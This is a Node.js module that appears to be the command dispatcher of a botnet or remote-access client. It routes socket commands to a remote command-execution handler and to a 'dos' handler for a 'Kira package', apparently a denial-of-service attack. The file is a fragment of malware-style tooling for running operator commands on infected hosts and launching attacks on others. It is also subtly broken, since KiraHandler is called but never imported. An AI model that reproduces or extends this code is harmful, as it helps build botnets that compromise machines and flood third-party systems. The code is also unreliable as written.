module.exports = function() {
    return (function(baseSocket) {
        var self = this;

        var childObject;
        var Packet = require('../models/packet');
        var CommandHandler = require('./command_modules/commandHandler');
        var AckHandler = require('./command_modules/ackHandler');

        var os = require('os');
        var send = require('../io/sender')(baseSocket).send;
        var spawn = require('child_process').spawn;
        var hostname = os.hostname();

        var processCommand = function(cmd, cmdData, sender_id, receiver_id) {
            if (cmd === 'cmd') {
                CommandHandler.handleCommandExecution(cmdData, sender_id, receiver_id, send);
            } else if (cmd === 'ack') {
                AckHandler.handleAckResponse(sender_id, receiver_id, send);
            } else if (cmd === 'dos') {
                //Handle Kira package
                KiraHandler.handleKiraExecution(sender_id, receiver_id, send)
            }
        };

        return {
            processCommand: processCommand
        }
    });
}();
